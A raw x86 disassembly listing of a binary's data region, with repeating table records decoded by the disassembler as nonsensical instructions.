  40916e:	00 00                	add    %al,(%eax)
  409170:	00 16                	add    %dl,(%esi)
  409172:	17                   	pop    %ss
  409173:	18 01                	sbb    %al,(%ecx)
  409175:	00 00                	add    %al,(%eax)
  409177:	00 83 83 00 00 00    	add    %al,0x83(%ebx)
  40917d:	12 13                	adc    (%ebx),%dl
  40917f:	0e                   	push   %cs
  409180:	00 00                	add    %al,(%eax)
  409182:	00 07                	add    %al,(%edi)
  409184:	07                   	pop    %es
  409185:	00 00                	add    %al,(%eax)
  409187:	00 01                	add    %al,(%ecx)
	...
  409191:	11 01                	adc    %eax,(%ecx)
  409193:	00 00                	add    %al,(%eax)
  409195:	00 63 63             	add    %ah,0x63(%ebx)
  409198:	00 00                	add    %al,(%eax)
  40919a:	00 01                	add    %al,(%ecx)
  40919c:	00 00                	add    %al,(%eax)
  40919e:	00 e7                	add    %ah,%bh
  4091a0:	e7 00                	out    %eax,$0x0
  4091a2:	00 00                	add    %al,(%eax)
  4091a4:	01 00                	add    %eax,(%eax)
  4091a6:	00 00                	add    %al,(%eax)
  4091a8:	97                   	xchg   %eax,%edi
  4091a9:	97                   	xchg   %eax,%edi
  4091aa:	00 00                	add    %al,(%eax)
  4091ac:	00 12                	add    %dl,(%edx)
  4091ae:	13 0e                	adc    (%esi),%ecx
  4091b0:	00 00                	add    %al,(%eax)
  4091b2:	00 07                	add    %al,(%edi)
  4091b4:	07                   	pop    %es
  4091b5:	00 00                	add    %al,(%eax)
  4091b7:	00 01                	add    %al,(%ecx)
	...
  4091c1:	11 01                	adc    %eax,(%ecx)
  4091c3:	00 00                	add    %al,(%eax)
  4091c5:	00 64 64 00          	add    %ah,0x0(%esp,%eiz,2)
  4091c9:	00 00                	add    %al,(%eax)
  4091cb:	1b 00                	sbb    (%eax),%eax
  4091cd:	00 00                	add    %al,(%eax)
  4091cf:	06                   	push   %es
  4091d0:	06                   	push   %es
  4091d1:	00 00                	add    %al,(%eax)
  4091d3:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  4091d6:	00 00                	add    %al,(%eax)
  4091d8:	00 64 64 00          	add    %ah,0x0(%esp,%eiz,2)
  4091dc:	00 00                	add    %al,(%eax)
  4091de:	16                   	push   %ss
  4091df:	17                   	pop    %ss
  4091e0:	18 01                	sbb    %al,(%ecx)
  4091e2:	00 00                	add    %al,(%eax)
  4091e4:	00 80 80 00 00 00    	add    %al,0x80(%eax)
  4091ea:	12 13                	adc    (%ebx),%dl
  4091ec:	0e                   	push   %cs
  4091ed:	00 00                	add    %al,(%eax)
  4091ef:	00 07                	add    %al,(%edi)
  4091f1:	07                   	pop    %es
  4091f2:	00 00                	add    %al,(%eax)
  4091f4:	00 01                	add    %al,(%ecx)
	...
  4091fe:	11 01                	adc    %eax,(%ecx)
  409200:	00 00                	add    %al,(%eax)
  409202:	00 65 65             	add    %ah,0x65(%ebp)
  409205:	00 00                	add    %al,(%eax)
  409207:	00 01                	add    %al,(%ecx)
  409209:	00 00                	add    %al,(%eax)
  40920b:	00 94 94 00 00 00 01 	add    %dl,0x1000000(%esp,%edx,4)
  409212:	00 00                	add    %al,(%eax)
  409214:	00 ae ae 00 00 00    	add    %ch,0xae(%esi)
  40921a:	12 13                	adc    (%ebx),%dl
  40921c:	0e                   	push   %cs
  40921d:	00 00                	add    %al,(%eax)
  40921f:	00 07                	add    %al,(%edi)
  409221:	07                   	pop    %es
  409222:	00 00                	add    %al,(%eax)
  409224:	00 01                	add    %al,(%ecx)
	...
  40922e:	11 01                	adc    %eax,(%ecx)
  409230:	00 00                	add    %al,(%eax)
  409232:	00 66 66             	add    %ah,0x66(%esi)
  409235:	00 00                	add    %al,(%eax)
  409237:	00 01                	add    %al,(%ecx)
  409239:	00 00                	add    %al,(%eax)
  40923b:	00 bd bd 00 00 00    	add    %bh,0xbd(%ebp)
  409241:	01 00                	add    %eax,(%eax)
  409243:	00 00                	add    %al,(%eax)
  409245:	92                   	xchg   %eax,%edx
  409246:	92                   	xchg   %eax,%edx
  409247:	00 00                	add    %al,(%eax)
  409249:	00 12                	add    %dl,(%edx)
  40924b:	13 0e                	adc    (%esi),%ecx
  40924d:	00 00                	add    %al,(%eax)
  40924f:	00 07                	add    %al,(%edi)
  409251:	07                   	pop    %es
  409252:	00 00                	add    %al,(%eax)
  409254:	00 01                	add    %al,(%ecx)
	...
  40925e:	11 01                	adc    %eax,(%ecx)
  409260:	00 00                	add    %al,(%eax)
  409262:	00 67 67             	add    %ah,0x67(%edi)
  409265:	00 00                	add    %al,(%eax)
  409267:	00 01                	add    %al,(%ecx)
  409269:	00 00                	add    %al,(%eax)
  40926b:	00 18                	add    %bl,(%eax)
  40926d:	18 00                	sbb    %al,(%eax)
  40926f:	00 00                	add    %al,(%eax)
  409271:	01 00                	add    %eax,(%eax)
  409273:	00 00                	add    %al,(%eax)
  409275:	37                   	aaa
  409276:	37                   	aaa
  409277:	00 00                	add    %al,(%eax)
  409279:	00 12                	add    %dl,(%edx)
  40927b:	13 0e                	adc    (%esi),%ecx
  40927d:	00 00                	add    %al,(%eax)
  40927f:	00 07                	add    %al,(%edi)
  409281:	07                   	pop    %es
  409282:	00 00                	add    %al,(%eax)
  409284:	00 01                	add    %al,(%ecx)
	...
  40928e:	11 01                	adc    %eax,(%ecx)
  409290:	00 00                	add    %al,(%eax)
  409292:	00 68 68             	add    %ch,0x68(%eax)
  409295:	00 00                	add    %al,(%eax)
  409297:	00 01                	add    %al,(%ecx)
  409299:	00 00                	add    %al,(%eax)
  40929b:	00 6a 6a             	add    %ch,0x6a(%edx)
  40929e:	00 00                	add    %al,(%eax)
  4092a0:	00 01                	add    %al,(%ecx)
  4092a2:	00 00                	add    %al,(%eax)
  4092a4:	00 1d 1d 00 00 00    	add    %bl,0x1d
  4092aa:	12 13                	adc    (%ebx),%dl
  4092ac:	0e                   	push   %cs
  4092ad:	00 00                	add    %al,(%eax)
  4092af:	00 07                	add    %al,(%edi)
  4092b1:	07                   	pop    %es
  4092b2:	00 00                	add    %al,(%eax)
  4092b4:	00 01                	add    %al,(%ecx)
	...
  4092be:	11 01                	adc    %eax,(%ecx)
  4092c0:	00 00                	add    %al,(%eax)
  4092c2:	00 69 69             	add    %ch,0x69(%ecx)
  4092c5:	00 00                	add    %al,(%eax)
  4092c7:	00 01                	add    %al,(%ecx)
  4092c9:	00 00                	add    %al,(%eax)
  4092cb:	00 2c 2c             	add    %ch,(%esp,%ebp,1)
  4092ce:	00 00                	add    %al,(%eax)
  4092d0:	00 01                	add    %al,(%ecx)
  4092d2:	00 00                	add    %al,(%eax)
  4092d4:	00 5b 5b             	add    %bl,0x5b(%ebx)
  4092d7:	00 00                	add    %al,(%eax)
  4092d9:	00 12                	add    %dl,(%edx)
  4092db:	13 0e                	adc    (%esi),%ecx
  4092dd:	00 00                	add    %al,(%eax)
  4092df:	00 07                	add    %al,(%edi)
  4092e1:	07                   	pop    %es
  4092e2:	00 00                	add    %al,(%eax)
  4092e4:	00 01                	add    %al,(%ecx)
	...
  4092ee:	11 01                	adc    %eax,(%ecx)
  4092f0:	00 00                	add    %al,(%eax)
  4092f2:	00 6a 6a             	add    %ch,0x6a(%edx)
  4092f5:	00 00                	add    %al,(%eax)
  4092f7:	00 01                	add    %al,(%ecx)
  4092f9:	00 00                	add    %al,(%eax)
  4092fb:	00 61 61             	add    %ah,0x61(%ecx)
  4092fe:	00 00                	add    %al,(%eax)
  409300:	00 01                	add    %al,(%ecx)
  409302:	00 00                	add    %al,(%eax)
  409304:	00 16                	add    %dl,(%esi)
  409306:	16                   	push   %ss
  409307:	00 00                	add    %al,(%eax)
  409309:	00 12                	add    %dl,(%edx)
  40930b:	13 0e                	adc    (%esi),%ecx
  40930d:	00 00                	add    %al,(%eax)
  40930f:	00 07                	add    %al,(%edi)
  409311:	07                   	pop    %es
  409312:	00 00                	add    %al,(%eax)
  409314:	00 01                	add    %al,(%ecx)
	...
  40931e:	11 01                	adc    %eax,(%ecx)
  409320:	00 00                	add    %al,(%eax)
  409322:	00 6b 6b             	add    %ch,0x6b(%ebx)
  409325:	00 00                	add    %al,(%eax)
  409327:	00 01                	add    %al,(%ecx)
  409329:	00 00                	add    %al,(%eax)
  40932b:	00 7f 7f             	add    %bh,0x7f(%edi)
  40932e:	00 00                	add    %al,(%eax)
  409330:	00 01                	add    %al,(%ecx)
  409332:	00 00                	add    %al,(%eax)
  409334:	00 51 51             	add    %dl,0x51(%ecx)
  409337:	00 00                	add    %al,(%eax)
  409339:	00 12                	add    %dl,(%edx)
  40933b:	13 0e                	adc    (%esi),%ecx
  40933d:	00 00                	add    %al,(%eax)
  40933f:	00 07                	add    %al,(%edi)
  409341:	07                   	pop    %es
  409342:	00 00                	add    %al,(%eax)
  409344:	00 01                	add    %al,(%ecx)
	...
  40934e:	11 01                	adc    %eax,(%ecx)
  409350:	00 00                	add    %al,(%eax)
  409352:	00 6c 6c 00          	add    %ch,0x0(%esp,%ebp,2)
  409356:	00 00                	add    %al,(%eax)
  409358:	01 00                	add    %eax,(%eax)
  40935a:	00 00                	add    %al,(%eax)
  40935c:	5d                   	pop    %ebp
  40935d:	5d                   	pop    %ebp
  40935e:	00 00                	add    %al,(%eax)
  409360:	00 01                	add    %al,(%ecx)
  409362:	00 00                	add    %al,(%eax)
  409364:	00 3c 3c             	add    %bh,(%esp,%edi,1)
  409367:	00 00                	add    %al,(%eax)
  409369:	00 12                	add    %dl,(%edx)
  40936b:	13 0e                	adc    (%esi),%ecx
  40936d:	00 00                	add    %al,(%eax)
  40936f:	00 07                	add    %al,(%edi)
  409371:	07                   	pop    %es
  409372:	00 00                	add    %al,(%eax)
  409374:	00 01                	add    %al,(%ecx)
	...
  40937e:	11 01                	adc    %eax,(%ecx)
  409380:	00 00                	add    %al,(%eax)
  409382:	00 6d 6d             	add    %ch,0x6d(%ebp)
  409385:	00 00                	add    %al,(%eax)
  409387:	00 01                	add    %al,(%ecx)
  409389:	00 00                	add    %al,(%eax)
  40938b:	00 0d 0d 00 00 00    	add    %cl,0xd
  409391:	01 00                	add    %eax,(%eax)
  409393:	00 00                	add    %al,(%eax)
  409395:	7f 7f                	jg     0x409416
  409397:	00 00                	add    %al,(%eax)
  409399:	00 12                	add    %dl,(%edx)
  40939b:	13 0e                	adc    (%esi),%ecx
  40939d:	00 00                	add    %al,(%eax)
  40939f:	00 07                	add    %al,(%edi)
  4093a1:	07                   	pop    %es
  4093a2:	00 00                	add    %al,(%eax)
  4093a4:	00 01                	add    %al,(%ecx)
	...
  4093ae:	11 01                	adc    %eax,(%ecx)
  4093b0:	00 00                	add    %al,(%eax)
  4093b2:	00 6e 6e             	add    %ch,0x6e(%esi)
  4093b5:	00 00                	add    %al,(%eax)
  4093b7:	00 01                	add    %al,(%ecx)
  4093b9:	00 00                	add    %al,(%eax)
  4093bb:	00 98 98 00 00 00    	add    %bl,0x98(%eax)
  4093c1:	01 00                	add    %eax,(%eax)
  4093c3:	00 00                	add    %al,(%eax)
  4093c5:	f5                   	cmc
  4093c6:	f5                   	cmc
  4093c7:	00 00                	add    %al,(%eax)
  4093c9:	00 12                	add    %dl,(%edx)
  4093cb:	13 0e                	adc    (%esi),%ecx
  4093cd:	00 00                	add    %al,(%eax)
  4093cf:	00 07                	add    %al,(%edi)
  4093d1:	07                   	pop    %es
  4093d2:	00 00                	add    %al,(%eax)
  4093d4:	00 01                	add    %al,(%ecx)
	...
  4093de:	11 01                	adc    %eax,(%ecx)
  4093e0:	00 00                	add    %al,(%eax)
  4093e2:	00 6f 6f             	add    %ch,0x6f(%edi)
  4093e5:	00 00                	add    %al,(%eax)
  4093e7:	00 1b                	add    %bl,(%ebx)
  4093e9:	00 00                	add    %al,(%eax)
  4093eb:	00 06                	add    %al,(%esi)
  4093ed:	06                   	push   %es
  4093ee:	00 00                	add    %al,(%eax)
  4093f0:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  4093f3:	00 00                	add    %al,(%eax)
  4093f5:	00 6f 6f             	add    %ch,0x6f(%edi)
  4093f8:	00 00                	add    %al,(%eax)
  4093fa:	00 16                	add    %dl,(%esi)
  4093fc:	17                   	pop    %ss
  4093fd:	18 01                	sbb    %al,(%ecx)
  4093ff:	00 00                	add    %al,(%eax)
  409401:	00 73 73             	add    %dh,0x73(%ebx)
  409404:	00 00                	add    %al,(%eax)
  409406:	00 12                	add    %dl,(%edx)
  409408:	13 0e                	adc    (%esi),%ecx
  40940a:	00 00                	add    %al,(%eax)
  40940c:	00 07                	add    %al,(%edi)
  40940e:	07                   	pop    %es
  40940f:	00 00                	add    %al,(%eax)
  409411:	00 01                	add    %al,(%ecx)
	...
  40941b:	11 01                	adc    %eax,(%ecx)
  40941d:	00 00                	add    %al,(%eax)
  40941f:	00 70 70             	add    %dh,0x70(%eax)
  409422:	00 00                	add    %al,(%eax)
  409424:	00 1b                	add    %bl,(%ebx)
  409426:	00 00                	add    %al,(%eax)
  409428:	00 06                	add    %al,(%esi)
  40942a:	06                   	push   %es
  40942b:	00 00                	add    %al,(%eax)
  40942d:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  409430:	00 00                	add    %al,(%eax)
  409432:	00 70 70             	add    %dh,0x70(%eax)
  409435:	00 00                	add    %al,(%eax)
  409437:	00 16                	add    %dl,(%esi)
  409439:	17                   	pop    %ss
  40943a:	18 01                	sbb    %al,(%ecx)
  40943c:	00 00                	add    %al,(%eax)
  40943e:	00 2c 2c             	add    %ch,(%esp,%ebp,1)
  409441:	00 00                	add    %al,(%eax)
  409443:	00 12                	add    %dl,(%edx)
  409445:	13 0e                	adc    (%esi),%ecx
  409447:	00 00                	add    %al,(%eax)
  409449:	00 07                	add    %al,(%edi)
  40944b:	07                   	pop    %es
  40944c:	00 00                	add    %al,(%eax)
  40944e:	00 01                	add    %al,(%ecx)
	...
  409458:	11 01                	adc    %eax,(%ecx)
  40945a:	00 00                	add    %al,(%eax)
  40945c:	00 71 71             	add    %dh,0x71(%ecx)
  40945f:	00 00                	add    %al,(%eax)
  409461:	00 01                	add    %al,(%ecx)
  409463:	00 00                	add    %al,(%eax)
  409465:	00 03                	add    %al,(%ebx)
  409467:	03 00                	add    (%eax),%eax
  409469:	00 00                	add    %al,(%eax)
  40946b:	01 00                	add    %eax,(%eax)
  40946d:	00 00                	add    %al,(%eax)
  40946f:	77 77                	ja     0x4094e8
  409471:	00 00                	add    %al,(%eax)
  409473:	00 12                	add    %dl,(%edx)
  409475:	13 0e                	adc    (%esi),%ecx
  409477:	00 00                	add    %al,(%eax)
  409479:	00 07                	add    %al,(%edi)
  40947b:	07                   	pop    %es
  40947c:	00 00                	add    %al,(%eax)
  40947e:	00 01                	add    %al,(%ecx)
	...
  409488:	11 01                	adc    %eax,(%ecx)
  40948a:	00 00                	add    %al,(%eax)
  40948c:	00 72 72             	add    %dh,0x72(%edx)
  40948f:	00 00                	add    %al,(%eax)
  409491:	00 01                	add    %al,(%ecx)
  409493:	00 00                	add    %al,(%eax)
  409495:	00 d7                	add    %dl,%bh
  409497:	d7                   	xlat   %ds:(%ebx)
  409498:	00 00                	add    %al,(%eax)
  40949a:	00 01                	add    %al,(%ecx)
  40949c:	00 00                	add    %al,(%eax)
  40949e:	00 f9                	add    %bh,%cl
  4094a0:	f9                   	stc
  4094a1:	00 00                	add    %al,(%eax)
  4094a3:	00 12                	add    %dl,(%edx)
  4094a5:	13 0e                	adc    (%esi),%ecx
  4094a7:	00 00                	add    %al,(%eax)
  4094a9:	00 07                	add    %al,(%edi)
  4094ab:	07                   	pop    %es
  4094ac:	00 00                	add    %al,(%eax)
  4094ae:	00 01                	add    %al,(%ecx)
	...
  4094b8:	11 01                	adc    %eax,(%ecx)
  4094ba:	00 00                	add    %al,(%eax)
  4094bc:	00 73 73             	add    %dh,0x73(%ebx)
  4094bf:	00 00                	add    %al,(%eax)
  4094c1:	00 1b                	add    %bl,(%ebx)
  4094c3:	00 00                	add    %al,(%eax)
  4094c5:	00 06                	add    %al,(%esi)
  4094c7:	06                   	push   %es
  4094c8:	00 00                	add    %al,(%eax)
  4094ca:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  4094cd:	00 00                	add    %al,(%eax)
  4094cf:	00 73 73             	add    %dh,0x73(%ebx)
  4094d2:	00 00                	add    %al,(%eax)
  4094d4:	00 16                	add    %dl,(%esi)
  4094d6:	17                   	pop    %ss
  4094d7:	18 01                	sbb    %al,(%ecx)
  4094d9:	00 00                	add    %al,(%eax)
  4094db:	00 48 48             	add    %cl,0x48(%eax)
  4094de:	00 00                	add    %al,(%eax)
  4094e0:	00 12                	add    %dl,(%edx)
  4094e2:	13 0e                	adc    (%esi),%ecx
  4094e4:	00 00                	add    %al,(%eax)
  4094e6:	00 07                	add    %al,(%edi)
  4094e8:	07                   	pop    %es
  4094e9:	00 00                	add    %al,(%eax)
  4094eb:	00 01                	add    %al,(%ecx)
	...
  4094f5:	11 01                	adc    %eax,(%ecx)
  4094f7:	00 00                	add    %al,(%eax)
  4094f9:	00 74 74 00          	add    %dh,0x0(%esp,%esi,2)
  4094fd:	00 00                	add    %al,(%eax)
  4094ff:	01 00                	add    %eax,(%eax)
  409501:	00 00                	add    %al,(%eax)
  409503:	da da                	fcmovu %st(2),%st
  409505:	00 00                	add    %al,(%eax)
  409507:	00 01                	add    %al,(%ecx)
  409509:	00 00                	add    %al,(%eax)
  40950b:	00 b5 b5 00 00 00    	add    %dh,0xb5(%ebp)
  409511:	12 13                	adc    (%ebx),%dl
  409513:	0e                   	push   %cs
  409514:	00 00                	add    %al,(%eax)
  409516:	00 07                	add    %al,(%edi)
  409518:	07                   	pop    %es
  409519:	00 00                	add    %al,(%eax)
  40951b:	00 01                	add    %al,(%ecx)
	...
  409525:	11 01                	adc    %eax,(%ecx)
  409527:	00 00                	add    %al,(%eax)
  409529:	00 75 75             	add    %dh,0x75(%ebp)
  40952c:	00 00                	add    %al,(%eax)
  40952e:	00 1b                	add    %bl,(%ebx)
  409530:	00 00                	add    %al,(%eax)
  409532:	00 06                	add    %al,(%esi)
  409534:	06                   	push   %es
  409535:	00 00                	add    %al,(%eax)
  409537:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  40953a:	00 00                	add    %al,(%eax)
  40953c:	00 75 75             	add    %dh,0x75(%ebp)
  40953f:	00 00                	add    %al,(%eax)
  409541:	00 16                	add    %dl,(%esi)
  409543:	17                   	pop    %ss
  409544:	18 01                	sbb    %al,(%ecx)
  409546:	00 00                	add    %al,(%eax)
  409548:	00 b9 b9 00 00 00    	add    %bh,0xb9(%ecx)
  40954e:	12 13                	adc    (%ebx),%dl
  409550:	0e                   	push   %cs
  409551:	00 00                	add    %al,(%eax)
  409553:	00 07                	add    %al,(%edi)
  409555:	07                   	pop    %es
  409556:	00 00                	add    %al,(%eax)
  409558:	00 01                	add    %al,(%ecx)
	...
  409562:	11 01                	adc    %eax,(%ecx)
  409564:	00 00                	add    %al,(%eax)
  409566:	00 76 76             	add    %dh,0x76(%esi)
  409569:	00 00                	add    %al,(%eax)
  40956b:	00 01                	add    %al,(%ecx)
  40956d:	00 00                	add    %al,(%eax)
  40956f:	00 8f 8f 00 00 00    	add    %cl,0x8f(%edi)
  409575:	01 00                	add    %eax,(%eax)
  409577:	00 00                	add    %al,(%eax)
  409579:	a0 a0 00 00 00       	mov    0xa0,%al
  40957e:	12 13                	adc    (%ebx),%dl
  409580:	0e                   	push   %cs
  409581:	00 00                	add    %al,(%eax)
  409583:	00 07                	add    %al,(%edi)
  409585:	07                   	pop    %es
  409586:	00 00                	add    %al,(%eax)
  409588:	00 01                	add    %al,(%ecx)
	...
  409592:	11 01                	adc    %eax,(%ecx)
  409594:	00 00                	add    %al,(%eax)
  409596:	00 77 77             	add    %dh,0x77(%edi)
  409599:	00 00                	add    %al,(%eax)
  40959b:	00 1b                	add    %bl,(%ebx)
  40959d:	00 00                	add    %al,(%eax)
  40959f:	00 06                	add    %al,(%esi)
  4095a1:	06                   	push   %es
  4095a2:	00 00                	add    %al,(%eax)
  4095a4:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  4095a7:	00 00                	add    %al,(%eax)
  4095a9:	00 77 77             	add    %dh,0x77(%edi)
  4095ac:	00 00                	add    %al,(%eax)
  4095ae:	00 16                	add    %dl,(%esi)
  4095b0:	17                   	pop    %ss
  4095b1:	18 01                	sbb    %al,(%ecx)
  4095b3:	00 00                	add    %al,(%eax)
  4095b5:	00 9e 9e 00 00 00    	add    %bl,0x9e(%esi)
  4095bb:	12 13                	adc    (%ebx),%dl
  4095bd:	0e                   	push   %cs
  4095be:	00 00                	add    %al,(%eax)
  4095c0:	00 07                	add    %al,(%edi)
  4095c2:	07                   	pop    %es
  4095c3:	00 00                	add    %al,(%eax)
  4095c5:	00 01                	add    %al,(%ecx)
	...
  4095cf:	11 01                	adc    %eax,(%ecx)
  4095d1:	00 00                	add    %al,(%eax)
  4095d3:	00 78 78             	add    %bh,0x78(%eax)
  4095d6:	00 00                	add    %al,(%eax)
  4095d8:	00 01                	add    %al,(%ecx)
  4095da:	00 00                	add    %al,(%eax)
  4095dc:	00 9c 9c 00 00 00 01 	add    %bl,0x1000000(%esp,%ebx,4)
  4095e3:	00 00                	add    %al,(%eax)
  4095e5:	00 ee                	add    %ch,%dh
  4095e7:	ee                   	out    %al,(%dx)
  4095e8:	00 00                	add    %al,(%eax)
  4095ea:	00 12                	add    %dl,(%edx)
  4095ec:	13 0e                	adc    (%esi),%ecx
  4095ee:	00 00                	add    %al,(%eax)
  4095f0:	00 07                	add    %al,(%edi)
  4095f2:	07                   	pop    %es
  4095f3:	00 00                	add    %al,(%eax)
  4095f5:	00 01                	add    %al,(%ecx)
	...
  4095ff:	11 01                	adc    %eax,(%ecx)
  409601:	00 00                	add    %al,(%eax)
  409603:	00 79 79             	add    %bh,0x79(%ecx)
  409606:	00 00                	add    %al,(%eax)
  409608:	00 01                	add    %al,(%ecx)
  40960a:	00 00                	add    %al,(%eax)
  40960c:	00 37                	add    %dh,(%edi)
  40960e:	37                   	aaa
  40960f:	00 00                	add    %al,(%eax)
  409611:	00 01                	add    %al,(%ecx)
  409613:	00 00                	add    %al,(%eax)
  409615:	00 53 53             	add    %dl,0x53(%ebx)
  409618:	00 00                	add    %al,(%eax)
  40961a:	00 12                	add    %dl,(%edx)
  40961c:	13 0e                	adc    (%esi),%ecx
  40961e:	00 00                	add    %al,(%eax)
  409620:	00 07                	add    %al,(%edi)
  409622:	07                   	pop    %es
  409623:	00 00                	add    %al,(%eax)
  409625:	00 01                	add    %al,(%ecx)
	...
  40962f:	11 01                	adc    %eax,(%ecx)
  409631:	00 00                	add    %al,(%eax)
  409633:	00 7a 7a             	add    %bh,0x7a(%edx)
  409636:	00 00                	add    %al,(%eax)
  409638:	00 1b                	add    %bl,(%ebx)
  40963a:	00 00                	add    %al,(%eax)
  40963c:	00 06                	add    %al,(%esi)
  40963e:	06                   	push   %es
  40963f:	00 00                	add    %al,(%eax)
  409641:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  409644:	00 00                	add    %al,(%eax)
  409646:	00 7a 7a             	add    %bh,0x7a(%edx)
  409649:	00 00                	add    %al,(%eax)
  40964b:	00 16                	add    %dl,(%esi)
  40964d:	17                   	pop    %ss
  40964e:	18 01                	sbb    %al,(%ecx)
  409650:	00 00                	add    %al,(%eax)
  409652:	00 d5                	add    %dl,%ch
  409654:	d5 00                	aad    $0x0
  409656:	00 00                	add    %al,(%eax)
  409658:	12 13                	adc    (%ebx),%dl
  40965a:	0e                   	push   %cs
  40965b:	00 00                	add    %al,(%eax)
  40965d:	00 07                	add    %al,(%edi)
  40965f:	07                   	pop    %es
  409660:	00 00                	add    %al,(%eax)
  409662:	00 01                	add    %al,(%ecx)
	...
  40966c:	11 01                	adc    %eax,(%ecx)
  40966e:	00 00                	add    %al,(%eax)
  409670:	00 7b 7b             	add    %bh,0x7b(%ebx)
  409673:	00 00                	add    %al,(%eax)
  409675:	00 1b                	add    %bl,(%ebx)
  409677:	00 00                	add    %al,(%eax)
  409679:	00 06                	add    %al,(%esi)
  40967b:	06                   	push   %es
  40967c:	00 00                	add    %al,(%eax)
  40967e:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  409681:	00 00                	add    %al,(%eax)
  409683:	00 7b 7b             	add    %bh,0x7b(%ebx)
  409686:	00 00                	add    %al,(%eax)
  409688:	00 16                	add    %dl,(%esi)
  40968a:	17                   	pop    %ss
  40968b:	18 01                	sbb    %al,(%ecx)
  40968d:	00 00                	add    %al,(%eax)
  40968f:	00 58 58             	add    %bl,0x58(%eax)
  409692:	00 00                	add    %al,(%eax)
  409694:	00 12                	add    %dl,(%edx)
  409696:	13 0e                	adc    (%esi),%ecx
  409698:	00 00                	add    %al,(%eax)
  40969a:	00 07                	add    %al,(%edi)
  40969c:	07                   	pop    %es
  40969d:	00 00                	add    %al,(%eax)
  40969f:	00 01                	add    %al,(%ecx)
	...
  4096a9:	11 01                	adc    %eax,(%ecx)
  4096ab:	00 00                	add    %al,(%eax)
  4096ad:	00 7c 7c 00          	add    %bh,0x0(%esp,%edi,2)
  4096b1:	00 00                	add    %al,(%eax)
  4096b3:	1b 00                	sbb    (%eax),%eax
  4096b5:	00 00                	add    %al,(%eax)
  4096b7:	06                   	push   %es
  4096b8:	06                   	push   %es
  4096b9:	00 00                	add    %al,(%eax)
  4096bb:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  4096be:	00 00                	add    %al,(%eax)
  4096c0:	00 7c 7c 00          	add    %bh,0x0(%esp,%edi,2)
  4096c4:	00 00                	add    %al,(%eax)
  4096c6:	16                   	push   %ss
  4096c7:	17                   	pop    %ss
  4096c8:	18 01                	sbb    %al,(%ecx)
  4096ca:	00 00                	add    %al,(%eax)
  4096cc:	00 c7                	add    %al,%bh
  4096ce:	c7 00 00 00 12 13    	movl   $0x13120000,(%eax)
  4096d4:	0e                   	push   %cs
  4096d5:	00 00                	add    %al,(%eax)
  4096d7:	00 07                	add    %al,(%edi)
  4096d9:	07                   	pop    %es
  4096da:	00 00                	add    %al,(%eax)
  4096dc:	00 01                	add    %al,(%ecx)
	...
  4096e6:	11 01                	adc    %eax,(%ecx)
  4096e8:	00 00                	add    %al,(%eax)
  4096ea:	00 7d 7d             	add    %bh,0x7d(%ebp)
  4096ed:	00 00                	add    %al,(%eax)
  4096ef:	00 01                	add    %al,(%ecx)
  4096f1:	00 00                	add    %al,(%eax)
  4096f3:	00 52 52             	add    %dl,0x52(%edx)
  4096f6:	00 00                	add    %al,(%eax)
  4096f8:	00 01                	add    %al,(%ecx)
  4096fa:	00 00                	add    %al,(%eax)
  4096fc:	00 3a                	add    %bh,(%edx)
  4096fe:	3a 00                	cmp    (%eax),%al
  409700:	00 00                	add    %al,(%eax)
  409702:	12 13                	adc    (%ebx),%dl
  409704:	0e                   	push   %cs
  409705:	00 00                	add    %al,(%eax)
  409707:	00 07                	add    %al,(%edi)
  409709:	07                   	pop    %es
  40970a:	00 00                	add    %al,(%eax)
  40970c:	00 01                	add    %al,(%ecx)
	...
  409716:	11 01                	adc    %eax,(%ecx)
  409718:	00 00                	add    %al,(%eax)
  40971a:	00 7e 7e             	add    %bh,0x7e(%esi)
  40971d:	00 00                	add    %al,(%eax)
  40971f:	00 1b                	add    %bl,(%ebx)
  409721:	00 00                	add    %al,(%eax)
  409723:	00 06                	add    %al,(%esi)
  409725:	06                   	push   %es
  409726:	00 00                	add    %al,(%eax)
  409728:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  40972b:	00 00                	add    %al,(%eax)
  40972d:	00 7e 7e             	add    %bh,0x7e(%esi)
  409730:	00 00                	add    %al,(%eax)
  409732:	00 16                	add    %dl,(%esi)
  409734:	17                   	pop    %ss
  409735:	18 01                	sbb    %al,(%ecx)
  409737:	00 00                	add    %al,(%eax)
  409739:	00 b2 b2 00 00 00    	add    %dh,0xb2(%edx)
  40973f:	12 13                	adc    (%ebx),%dl
  409741:	0e                   	push   %cs
  409742:	00 00                	add    %al,(%eax)
  409744:	00 07                	add    %al,(%edi)
  409746:	07                   	pop    %es
  409747:	00 00                	add    %al,(%eax)
  409749:	00 01                	add    %al,(%ecx)
	...
  409753:	11 01                	adc    %eax,(%ecx)
  409755:	00 00                	add    %al,(%eax)
  409757:	00 7f 7f             	add    %bh,0x7f(%edi)
  40975a:	00 00                	add    %al,(%eax)
  40975c:	00 01                	add    %al,(%ecx)
  40975e:	00 00                	add    %al,(%eax)
  409760:	00 d2                	add    %dl,%dl
  409762:	d2 00                	rolb   %cl,(%eax)
  409764:	00 00                	add    %al,(%eax)
  409766:	01 00                	add    %eax,(%eax)
  409768:	00 00                	add    %al,(%eax)
  40976a:	bf bf 00 00 00       	mov    $0xbf,%edi
  40976f:	12 13                	adc    (%ebx),%dl
  409771:	0e                   	push   %cs
  409772:	00 00                	add    %al,(%eax)
  409774:	00 07                	add    %al,(%edi)
  409776:	07                   	pop    %es
  409777:	00 00                	add    %al,(%eax)
  409779:	00 01                	add    %al,(%ecx)
	...
  409783:	11 01                	adc    %eax,(%ecx)
  409785:	00 00                	add    %al,(%eax)
  409787:	00 80 80 00 00 00    	add    %al,0x80(%eax)
  40978d:	01 00                	add    %eax,(%eax)
  40978f:	00 00                	add    %al,(%eax)
  409791:	7d 7d                	jge    0x409810
  409793:	00 00                	add    %al,(%eax)
  409795:	00 01                	add    %al,(%ecx)
  409797:	00 00                	add    %al,(%eax)
  409799:	00 11                	add    %dl,(%ecx)
  40979b:	11 00                	adc    %eax,(%eax)
  40979d:	00 00                	add    %al,(%eax)
  40979f:	12 13                	adc    (%ebx),%dl
  4097a1:	19 00                	sbb    %eax,(%eax)
  4097a3:	00 00                	add    %al,(%eax)
  4097a5:	04 04                	add    $0x4,%al
